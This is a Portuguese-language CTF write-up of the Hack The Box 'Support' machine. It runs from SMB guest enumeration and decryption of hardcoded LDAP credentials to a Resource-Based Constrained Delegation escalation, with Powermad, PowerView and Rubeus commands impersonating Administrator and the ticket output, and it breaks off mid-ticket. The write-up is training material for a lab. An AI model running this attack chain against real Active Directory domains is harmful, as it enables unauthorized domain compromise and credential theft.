# Writeup support

## Scan

```bash
# Nmap 7.93 scan initiated Tue Jan  9 14:39:17 2024 as: nmap -A -sC -Pn -oN fullnmap.txt -p- -T5 -v support.htb
Nmap scan report for support.htb (10.129.227.255)
Host is up (0.22s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-09 17:47:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
57041/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Uptime guess: 47.157 days (since Thu Nov 23 11:02:56 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-09T17:48:13
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   219.19 ms 10.10.14.1
2   219.48 ms support.htb (10.129.227.255)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  9 14:48:53 2024 -- 1 IP address (1 host up) scanned in 575.51 seconds
```

## Enumeration & Exploitation

​	Após fazer o scan, comecamos a enumerar a máquina e percebemos que temos acesso ao SMB como guest.

```bash
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ netexec smb support.htb -u 'guest' -p '' --shares
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\guest: 
SMB         10.129.227.255  445    DC               [*] Enumerated shares
SMB         10.129.227.255  445    DC               Share           Permissions     Remark
SMB         10.129.227.255  445    DC               -----           -----------     ------
SMB         10.129.227.255  445    DC               ADMIN$                          Remote Admin
SMB         10.129.227.255  445    DC               C$                              Default share
SMB         10.129.227.255  445    DC               IPC$            READ            Remote IPC
SMB         10.129.227.255  445    DC               NETLOGON                        Logon server share 
SMB         10.129.227.255  445    DC               support-tools   READ            support staff tools
SMB         10.129.227.255  445    DC               SYSVOL                          Logon server share
```

​	Ao acessar a pasta **support-tools**, é possível ver que existe alguns arquivos. Depois de uma análise, o arquivo que nos interessa é o **UserInfo.exe.zip**.

```bash
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ smbclient //10.129.227.255/'support-tools' -U "guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 14:01:06 2022
  ..                                  D        0  Sat May 28 08:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 08:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 08:19:55 2022
  putty.exe                           A  1273576  Sat May 28 08:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 08:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 14:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 08:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 08:19:43 2022

                4026367 blocks of size 4096. 968152 blocks available
smb: \> mget UserInfo.exe.zip
Get file UserInfo.exe.zip? y
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (151.5 KiloBytes/sec) (average 151.5 KiloBytes/sec)
smb: \> exit
```

​	Ao descompactar o arquivo, percebemos que existe alguns aqruivos de DLL e um arquivo executável.

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/list_files.png)

​	A partir desse momento, a box possui dois caminhos para pegar o usuário desse arquivo executável. Podemos fazer análise de tráfego com wireshark ou fazer engenharia reversa no executável.

**OBS:** Ambas as tools **Mono** e **ilspycmd** podem ser encontradas como instalar [aqui](https://github.com/CalegariMindSec/My_Notes#kali-linux-windows-features). 

### Método 1 - Análise de Tráfego

​	Para fazer a análise de tráfego, é necessário arrumarmos uma maneira de executar o arquivo **.exe** no kali e, para isso, utilizaremos o **Mono**.

```bash
┌──(kali㉿kali)-[~/…/HTB/support/files]
└─$ mono UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user
```

​	Para conseguirmos pegar o tráfego com a máquina, precisamos seguir os seguintes passos: 

1. Adicionar o host em **/etc/hosts** -> `IP_MACHINE  support.htb`

2. Executar o wireshark e escolher a interface da VPN.

3. Executar um comando de consulta no executável

   ```bash
   ┌──(kali㉿kali)-[~/…/machines/to-do/support/files]
   └─$ mono UserInfo.exe find -first aaaaaaa   
   
   
   [-] Exception: No Such Object
   ```

4. Capturar o tráfego e pegar o login utilizado.

   ![](/home/kali/Desktop/HTB/machines/to-do/support/ss/wireshark_credential.png)

### Método 2 - Engenharia Reversa e Decrypt

​	Para fazer a engenharia reversa, é necessário encontrar um decompiler de **.NET** para Linux e, para isso, usaremos o **ilspysmd**.

```bash
┌──(kali㉿kali)-[~/…/HTB/support/files]
└─$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB/support/files]
└─$ ilspycmd UserInfo.exe -p -o /home/kali/Desktop/HTB/machines/to-do/support/files/a/
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB/support/files]
└─$ ls a  
app.config  Properties  UserInfo  UserInfo.Commands  UserInfo.csproj  UserInfo.Services
```

​	Feito o decompile, podemos analisar o código fonte e ver onde a conexão é feita para podermos pegar o usuário e a senha.

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/connection_ldap.png)

​	Após uma análise, podemos descobrir que a senha está encryptada. 

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/encrypted.png)

​	Podemos usar o **chatgp** para escrever um code de decrypt em python3 para facilitar nossa vida. 

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

def decrypt_password(encoded_password, decryption_key):
    decoded_bytes = base64.b64decode(encoded_password)
    key_length = len(decryption_key)
    decrypted_bytes = bytearray(decoded_bytes)

    for i in range(len(decoded_bytes)):
        decrypted_bytes[i] = (decoded_bytes[i] ^ decryption_key[i % key_length] ^ 0xDF)

    return decrypted_bytes.decode('latin-1')

# Chamada da função para obter e imprimir a senha descriptografada
senha_descriptografada = decrypt_password(enc_password, key)
print("Senha descriptografada:", senha_descriptografada)
```

​	Após executar o código escrito pelo chatgpt, conseguimos a senha do usuário.

```bash
┌──(kali㉿kali)-[~/…/HTB/machines/to-do/support]
└─$ python3 a.py      
Senha descriptografada: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

​	Com as credenciais de acesso, podemos fazer enumeracão de LDAP com **ldapdomaindump**.

```bash
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ netexec smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

┌──(kali㉿kali)-[~/…/HTB/support/ldapdomaindump]
└─$ ldapdomaindump support.htb -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished                                                                                                                                                                        
┌──(kali㉿kali)-[~/…/HTB/support/ldapdomaindump]
└─$ ls                                                                                         
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

​	Feito o dump, podemos analisar os arquivos e ver se achamos algo que seja útil. Após uma pesquisa no arquivo **domain_users.json**, podemos encontrar o que seria uma possível senha de acesso do usuário **support**.

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/info_support.png)

​	Ao validar as credenciais, podemos perceber que elas possuem acesso à máquina via winrm e podemos usar isso para logar e pegar a flag de user.

```bash
┌──(kali㉿kali)-[~/…/HTB/support/ldapdomaindump]
└─$ netexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.129.227.255  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)                                                                                                                                         
┌──(kali㉿kali)-[~/…/HTB/support/ldapdomaindump]
└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'                                                      
Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
a130a88738451f5b52840559188ff148
*Evil-WinRM* PS C:\Users\support\Desktop>
```

## Privilege Escalation

​	O PrivEsc dessa máquina se dá através de uma exploracao de RBCD (Resource-Based Constrained Delegation).

Referências:

1. [RBCD - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
2. [Rubeus - S4U](https://github.com/GhostPack/Rubeus#s4u) 

​	Para comecar, quando estivermos com uma shell do usuário **support**, usamos o **SharpHound** para enumerar o domínio.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound4.exe --CollectionMethods All --Domain support.htb --ExcludeDCs
2024-01-10T07:06:28.5709979-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2024-01-10T07:06:28.7741283-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-10T07:06:28.8053779-08:00|INFORMATION|Initializing SharpHound at 7:06 AM on 1/10/2024
2024-01-10T07:06:29.2057856-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-10T07:06:29.4088830-08:00|INFORMATION|Beginning LDAP search for support.htb
2024-01-10T07:06:29.5338750-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-01-10T07:06:29.5338750-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-01-10T07:06:59.9179499-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-01-10T07:07:17.8467252-08:00|INFORMATION|Consumers finished, closing output channel
2024-01-10T07:07:17.8936040-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-01-10T07:07:18.0498653-08:00|INFORMATION|Status: 109 objects finished (+109 2.270833)/s -- Using 45 MB RAM
2024-01-10T07:07:18.0498653-08:00|INFORMATION|Enumeration finished in 00:00:48.6614452
2024-01-10T07:07:18.1592287-08:00|INFORMATION|Saving cache with stats: 68 ID to type mappings.
 68 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-01-10T07:07:18.1592287-08:00|INFORMATION|SharpHound Enumeration Completed at 7:07 AM on 1/10/2024! Happy Graphing!
```

​	Feito a coleta, fazemos o upload do arquivo no **BloodHound** e analisamos o arquivo. Podemos perceber que a secão **Group Delegated Object Control** mostra um valor de 1 . Este valor mostra se um grupo do qual nosso usuário é membro tem acesso a objetos de controle no domínio. 

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/find_delegated_control.png)

​	Ao clicar no objeto para obter mais informacões, vemos que o grupo **Shared Support Accounts** tem permissão **GenericAll** na máquina.

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/genericall.png)

​	No **BloodHound** podemos selecionar esses privilégios e, ao clicar no botão **help**, ter informacões de como explorar essa configuracão. 

![](/home/kali/Desktop/HTB/machines/to-do/support/ss/help_info.png)

​	Para a exploracão, precisaremos do **Rubeus**, **Powerview** e **Powermad**.

​	Primeiramente, precisamos pegar o FQDN da máquina para adicionar ao **/etc/hosts**.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-Domain


Forest                  : support.htb
DomainControllers       : {dc.support.htb}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : dc.support.htb
RidRoleOwner            : dc.support.htb
InfrastructureRoleOwner : dc.support.htb
Name                    : support.htb
```

​	Dessa maneira, podemos adicionar **dc.support.htb** ao **/etc/hosts**. 

​	Em seguida, temos que descobrir quantos computadores um usuário pode adicionar ao domínio.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity support -Properties ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

​	Feito isso, podemos verificar se o valor da propriedade **msds-allowedtoactonbehalfofotheridentity** ta vazio, o que significa que estamos prontos para realizar o ataque RBCD.. A propriedade **msds-allowedtoactonbehalfofotheridentity** está relacionada ao Active Directory e ao gerenciamento de identidades. No  contexto do Active Directory, essa propriedade faz parte do conjunto de  atributos estendidos que podem ser associados a objetos de segurança.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC
```

​	Com as informacões checadas, podemos usar o **Powermad** para criar um computador falso chamado **FAKE01** e adicioná-lo ao domínio.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE01$
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE01 added
```

​	Com o computador criado, podemos usar o **Powerview** para verificar se o computador foi criado e pegar o nome do usuário na propriedade **samaccountname**.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer FAKE01


pwdlastset             : 1/10/2024 7:55:49 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE01
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5601
samaccountname         : FAKE01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 1/10/2024 3:55:49 PM
instancetype           : 4
usncreated             : 86098
objectguid             : 10716e2e-4357-45e6-9579-17eda39b7d24
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.support.htb, HOST/FAKE01.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FAKE01
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 1/10/2024 3:55:49 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 86100
dnshostname            : FAKE01.support.htb
```

​	Com o nome do usuário, podemos dar permissão de privilégios de delegacão ao mesmo e verificar se deu certo.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE01$
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=FAKE01,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
```

​	O comando **Set-ADComputer** é responsável por dar a permissão ao usuário, enquanto o comando **Get-ADComputer** serve para verificar se tudo deu certo. Podemos notar que a propriedade **PrincipalsAllowedToDelegateToAccount** possui o valor **FAKE01**, o que serva para comprovar o êxito.

​	Feito isso, podemos novamente verificar o valor da propriedade **msds-allowedtoactonbehalfofotheridentity **e agora percebemos que existe um valor em bytes.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

​	Podemos salavar esses valores em uma variável para transaformar os bytes em uma string. Para isso, executamos os seguintes comandos:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor

ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80
```

​	Para mostrar a lista de permissões de acesso do objeto (**DiscretionaryAcl: {System.Security.AccessControl.CommonAce}**) podemos usar o seguinte comando:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

​	Com isso, podemos ver que o **SID** é o **SID** do computador **FAKE01** e que o **AceType** está com o valor **AccessAllowed**.

​	Agora, utilizamos o **Rubeus** para pegar a hash **rc4_hmac** do usuário **FAKE01$**.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:123456 /user:fake01$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake01.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 4799D0F80833802EE7F1412BD30DCD5C
[*]       aes256_cts_hmac_sha1 : 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
[*]       des_cbc_md5          : 836D4C85A4F23B62
```

​	Com o hash obtido, podemos gerar um ticket para o usuário **Administrator**.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE01$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFUjCCBU6gAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBCUwggQhoAMCARKhAwIBAqKCBBMEggQPAL78b923
      rGCicn4pwZk0bfwt1GoXmaoYh/Wku4i0YhxMaUgHzIM/I8GLalzG5EBSajzoLHKM0o9Msf+KBssgoHEn
      1vmQsk/QQux6C4g7KViT/wBD8wC/8zeNr/awfncvG88qia9PD6AclK/lK75UEdKCN/WE7ncBLICt81kQ
      9PWdl00acxgLrYg0IKDgwQ1KMIpHl8GelR5FRF/6Q0l3dENfJaAG7OXeaXwo+LAOmU/BkoBt+PImYmSe
      SrsK5kdu/GqDuI+tTDnUk4jr9syK69rFjVRmbVhruwjXmagThMn8dnzwQ7SbnrxWUKKBgLayFi1l6hGL
      o/aEydTcKFuI9LO2T4e1ZTl7VbFsR7YeWXGlsLONRyNIfvGihYec///fz57CWX0K1lUvUFBei0kiGDQT
      kq/IOO8wqbNZ/BUjQOxEJx7f2Vdoxx0VwplRzgoFDjCyhoz2Xvg+i2IQwQldDs/oJbO/YHkWL0XMQvTg
      D3tBSrP0l6XHxduPY5w4Up9LOzoK3Z/UVu9Aj9UlUPQg3Jnp7H9hj5va2elH56UGqOL5FsEZeihhBCaa
      rojucbSZzudJpkqh0BQ2NE12+okhgmaJTw4ItXg+2WGCytmjgq5k+QiFPa0t3Lv6/kazcMf1QPCduzuG
      dKv7A2qQwiu7K/Sw81U4lXfp/YJx/X9X7mL+TKn73ph5UVAByNiSYRLDK2chzUmda5fBDytAAP2U8QN4
      Q17L6NB84SSYWA9+Bjh6OiXXopfbXTBn2LscpT0X9RqYISHajroOVHEJo1hJQVkTwPshng1oMXI09ppY
      AxSLarGTDQUti130T1Ug0FakFuMK6jwx6jPAizYD51hTPRnfRXrRdelJ0gnfw4kz9F6JjR31YWsXPhGK
      mzzlXIsIKdROQCXWauigg91bDrWg7+0LLV78pVobgzVg5mICpwBPKhVp6KL0ERLWLfMW6SJofanJX+my
      bm/o6d2zF4bamgZC5ySRtb1H3cC6eYNQHXBu9UEaEWRXIG9zwRYYjhTbEPq6dpAFW3v7tXs8dhwYaZCi
      yO2Zu7OrlLeVE6Ydf5zWHUP4q517qk/ilOUvwmSNAyOLMOX3B+mY87djRRCeDEIKZNBlDnF8MJEdq2dt
      IFSWR2q7FegAwBAGg3w6M9CulN+bFXtJ+w31FQeRMJ7Dz0Ds/ZTtyZodT6nE6VgIDGQmvDv3o9r0OAsx
      vRVDj/G+5cscdZEY8KT6tIG2JARNxT4xBY93/nJqHja1dcp5bUIhlqRJVyM4+wFYaUSsilp3H4TDjW+O
      P/iCkJK75H0amdetHLUA6Z5WHbgZJjUnXgguy0mvkM/tljEzc/c1UH6nn4ssvzIE5S5/g4OHWLLMYn8y
      NRdMX2/u5cQCf6jzaqOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEPQk
      1ifu6SFscVVJEmCnPKOhDRsLU1VQUE9SVC5IVEKiFDASoAMCAQGhCzAJGwdGQUtFMDEkowcDBQBA4QAA
      pREYDzIwMjQwMTEwMTYzNzAxWqYRGA8yMDI0MDExMTAyMzcwMVqnERgPMjAyNDAxMTcxNjM3MDFaqA0b
      C1NVUFBPUlQuSFRCqSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==


[*] Action: S4U

[*] Building S4U2self request for: 'FAKE01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      QUtFMDEk

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGYDCCBlygAwIBBaEDAgEWooIFcjCCBW5hggVqMIIFZqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggUrMIIFJ6ADAgESoQMCAQWiggUZBIIFFSOX580D
